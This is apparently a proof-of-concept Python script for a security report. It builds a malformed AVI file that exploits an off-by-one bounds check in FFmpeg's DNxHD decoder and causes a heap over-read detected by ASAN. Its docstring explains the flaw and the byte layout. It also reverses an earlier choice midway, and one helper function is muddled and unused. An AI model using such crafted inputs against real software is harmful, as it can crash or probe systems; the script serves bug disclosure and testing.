#!/usr/bin/env python3
"""
PoC generator for VULN 001: Off-by-one in mb_scan_index bounds check
in dnxhd_decode_header() (libavcodec/dnxhddec.c, line 344).

The vulnerability (line 344):
  if (buf_size - ctx->data_offset < ctx->mb_scan_index[i])
Uses strict '<' instead of '<='.  When mb_scan_index[row] exactly equals
buf_size - data_offset, the check passes.  Then dnxhd_decode_row() calls:
  init_get_bits8(&row->gb, ctx->buf + offset, ctx->buf_size - offset)
with offset == ctx->buf_size and size_in_bits=0.  Because
UNCHECKED_BITSTREAM_READER is defined, UPDATE_CACHE_BE calls
AV_RB32(gb->buffer + ...) without bounds checks, reading past the heap
allocation.

We wrap the DNxHD frame in a minimal AVI RIFF container (codec tag 'AVDN')
so the AVI demuxer delivers the packet with exactly frame_size bytes, meaning
the ASAN poisoned zone starts immediately at buf + frame_size + 64.  The
macroblock VLC decode loop accumulates reads that advance well beyond 64 bytes
past the frame boundary, reliably triggering ASAN's heap-buffer-overflow.

DNxHD frame layout (non-HR format, data_offset=0x280, mb_height <= 68):
  buf[0x00..0x04] : DNXHD_HEADER_INITIAL magic (00 00 02 80 01)
  buf[0x18..0x19] : height  (big-endian)
  buf[0x1a..0x1b] : width   (big-endian)
  buf[0x21]       : bitdepth indicator (0x20 → 8-bit)
  buf[0x28..0x2b] : CID     (big-endian, 1237 = 1920x1080 8-bit fixed size)
  buf[0x16c..0x16d]: mb_height (big-endian)
  buf[0x170+i*4]  : mb_scan_index[i] (big-endian uint32)
  buf[0x280..]    : coded data region (all zeros)

CID 1237 has coding_unit_size=606208 but the buf_size < coding_unit_size check
applies only to the packet size; we just need buf_size >= data_offset=0x280 for
the header to parse. We set width/height to match what the code reads from the
header, and use CID 1237 which is 8-bit – the dimension check uses
cid_table->width=1920 which != ctx->width (16), but since the aspect ratio
reduction path (av_reduce) only adjusts ctx->width, it does NOT block execution.

Actually: let's use CID 1273 (variable size) to avoid the dimension check entirely.
CID 1273 packet_scale = {18944, 255}, CID 1237 has coding_unit_size=606208.
Since CID 1273 has coding_unit_size=DNXHD_VARIABLE=0, buf_size < 0 is always false.

The AVI container makes the AVI demuxer deliver an exact-size packet, so:
  - AVI chunk size = FRAME_SIZE bytes exactly
  - av_new_packet inside the AVI demuxer allocates FRAME_SIZE + 64 bytes
  - ASAN poisons at offset FRAME_SIZE + 64
  - VLC decoding from buf + FRAME_SIZE reads ~82+ bytes, exceeding 64-byte padding
  - ASAN reports heap-buffer-overflow
"""

import struct

# ── DNxHD frame parameters ────────────────────────────────────────────────────
# DNXHD_HEADER_INITIAL = 0x000002800100
# buf[0..4] encodes this: AV_RB32(buf)=0x00000280, buf[4]=0x01
MAGIC = bytes([0x00, 0x00, 0x02, 0x80, 0x01])

# CID 1273 = DNxHR SQ: variable width/height/coding_unit_size, bit_depth=8
# coding_unit_size = DNXHD_VARIABLE = 0  →  buf_size < 0 always false ✓
# cid_table->width = DNXHD_VARIABLE = 0  →  aspect-ratio branch skipped ✓
CID = 1273

WIDTH   = 16   # minimal; mb_width  = (16+15)>>4 = 1
HEIGHT  = 16   # minimal; mb_height_check: 1 <= (16+15)>>4 = 1  ✓

MB_HEIGHT = 1  # = (HEIGHT+15)>>4 = 1; must be ≤ 68 for non-HR path

# data_offset is fixed 0x280 when mb_height <= 68 and NOT HR format
DATA_OFFSET = 0x280  # 640

# Total DNxHD frame bytes.  The off-by-one scan index = FRAME_SIZE - DATA_OFFSET.
# AVI demuxer allocates FRAME_SIZE + 64 bytes; ASAN poisons at FRAME_SIZE+64.
# One macroblock's VLC decode reads ~82 bytes past FRAME_SIZE, exceeding the 64-
# byte padding → ASAN heap-buffer-overflow.
FRAME_SIZE = 0x300  # 768; CODED_SIZE = 768 - 640 = 128 = 0x80

assert FRAME_SIZE >= DATA_OFFSET
CODED_SIZE = FRAME_SIZE - DATA_OFFSET  # 128

# Row 0's mb_scan_index is set to CODED_SIZE = the off-by-one boundary.
# The check  (buf_size - data_offset) < mb_scan_index[0]
#           = CODED_SIZE < CODED_SIZE  = False  →  passes (off-by-one)
MB_SCAN_INDEX_0 = CODED_SIZE  # = 0x80 = 128

# ── Build the DNxHD frame buffer ──────────────────────────────────────────────
frame = bytearray(FRAME_SIZE)

# Header magic bytes 0-4 (DNXHD_HEADER_INITIAL)
frame[0:5] = MAGIC

# buf[5]: interlaced=0 (bit1=0)
frame[5] = 0x00

# buf[6]: mbaff=0 (bit5=0)
frame[6] = 0x00

# buf[7]: alpha=0, lla=0
frame[7] = 0x00

# buf[0x18..0x19]: height (big-endian); also sets parser h for consistency
struct.pack_into('>H', frame, 0x18, HEIGHT)

# buf[0x1a..0x1b]: width (big-endian)
struct.pack_into('>H', frame, 0x1a, WIDTH)

# buf[0x21]: bitdepth indicator: (0x20 >> 5) = 1 → 8-bit
frame[0x21] = 0x20

# buf[0x28..0x2b]: CID (big-endian)  1273 = 0x000004F9
struct.pack_into('>I', frame, 0x28, CID)

# buf[0x2c]: colorspace=BT.709, ACT=0, is_444=0
frame[0x2c] = 0x00

# buf[0x16c..0x16d]: mb_height (big-endian)
struct.pack_into('>H', frame, 0x16c, MB_HEIGHT)

# buf[0x170..0x173]: mb_scan_index[0] = CODED_SIZE (off-by-one trigger)
struct.pack_into('>I', frame, 0x170, MB_SCAN_INDEX_0)

# Remaining bytes are 0x00.

# ── Wrap in minimal AVI RIFF container ───────────────────────────────────────
# AVI uses little-endian for chunk sizes.
#
# Structure:
#   RIFF .... AVI                       (12 bytes)
#     LIST .... hdrl                    (LIST + size + 'hdrl')
#       avih ....                       (avih)
#       LIST .... strl                  (strl)
#         strh ....                     (video stream header)
#         strf ....                     (BITMAPINFOHEADER with codec 'AVDN')
#     LIST .... movi                    (movi list)
#       00dc ....                       (video frame chunk)

def fourcc(s):
    return s.encode('ascii')

def chunk(tag, data):
    data = bytes(data)
    # pad to word boundary
    if len(data) % 2:
        data += b'\x00'
    return fourcc(tag) + struct.pack('<I', len(bytes(data).rstrip(b'\x00') if len(data) % 2 else data) ) + data

# avih (AVIMainHeader, 56 bytes)
FPS_NUM    = 25
FPS_DEN    = 1
FRAME_RATE = FPS_NUM * 1000000  # microseconds
avih_data = struct.pack('<IIIIIIIIIIIIII',
    1000000 // FPS_NUM,  # dwMicroSecPerFrame
    0,                   # dwMaxBytesPerSec
    0,                   # dwPaddingGranularity
    0x10,                # dwFlags (AVIF_HASINDEX)
    1,                   # dwTotalFrames
    0,                   # dwInitialFrames
    1,                   # dwStreams
    FRAME_SIZE,          # dwSuggestedBufferSize
    WIDTH,               # dwWidth
    HEIGHT,              # dwHeight
    0, 0, 0, 0           # dwReserved
)

# strh (AVIStreamHeader, 56 bytes) for video
strh_data = bytearray(56)
strh_data[0:4]   = b'vids'        # fccType
strh_data[4:8]   = b'AVDN'        # fccHandler
struct.pack_into('<I', strh_data, 20, FPS_DEN)   # dwScale
struct.pack_into('<I', strh_data, 24, FPS_NUM)   # dwRate
struct.pack_into('<I', strh_data, 32, 1)         # dwLength
struct.pack_into('<I', strh_data, 36, FRAME_SIZE)# dwSuggestedBufferSize

# strf (BITMAPINFOHEADER, 40 bytes) for video
strf_data = bytearray(40)
struct.pack_into('<I', strf_data, 0,  40)           # biSize
struct.pack_into('<i', strf_data, 4,  WIDTH)        # biWidth
struct.pack_into('<i', strf_data, 8,  HEIGHT)       # biHeight
struct.pack_into('<H', strf_data, 12, 1)            # biPlanes
struct.pack_into('<H', strf_data, 14, 8)            # biBitCount
strf_data[16:20] = b'AVDN'                          # biCompression (codec tag)
struct.pack_into('<I', strf_data, 20, FRAME_SIZE)   # biSizeImage

def make_chunk(tag, data):
    data = bytes(data)
    result = tag.encode('ascii') + struct.pack('<I', len(data)) + data
    if len(data) % 2:
        result += b'\x00'
    return result

def make_list(list_type, data):
    data = bytes(data)
    return b'LIST' + struct.pack('<I', len(data) + 4) + list_type.encode('ascii') + data

# hdrl contents
strl = make_chunk('strh', strh_data) + make_chunk('strf', strf_data)
hdrl = make_chunk('avih', avih_data) + make_list('strl', strl)

# movi: one video chunk '00dc'
video_chunk = make_chunk('00dc', frame)

movi = make_list('movi', video_chunk)

# AVI main RIFF
avi_content = make_list('hdrl', hdrl) + movi
avi = b'RIFF' + struct.pack('<I', len(avi_content) + 4) + b'AVI ' + avi_content

OUTPUT = 'vuln_001_input.avi'
with open(OUTPUT, 'wb') as f:
    f.write(avi)

print(f"[+] Written {len(avi)} bytes to {OUTPUT}")
print(f"    FRAME_SIZE      = 0x{FRAME_SIZE:03X} ({FRAME_SIZE})")
print(f"    DATA_OFFSET     = 0x{DATA_OFFSET:03X} ({DATA_OFFSET})")
print(f"    CODED_SIZE      = 0x{CODED_SIZE:02X}  ({CODED_SIZE})")
print(f"    MB_SCAN_INDEX_0 = 0x{MB_SCAN_INDEX_0:02X}  ({MB_SCAN_INDEX_0})")
print()
print("    Trigger: mb_scan_index[0] == CODED_SIZE passes strict '<' check.")
print(f"    AVI demuxer delivers {FRAME_SIZE}-byte packet → ASAN zone at +{FRAME_SIZE+64}.")
print(f"    VLC macroblock decode reads ~82 bytes past FRAME_SIZE → OOB at +{FRAME_SIZE+82}.")
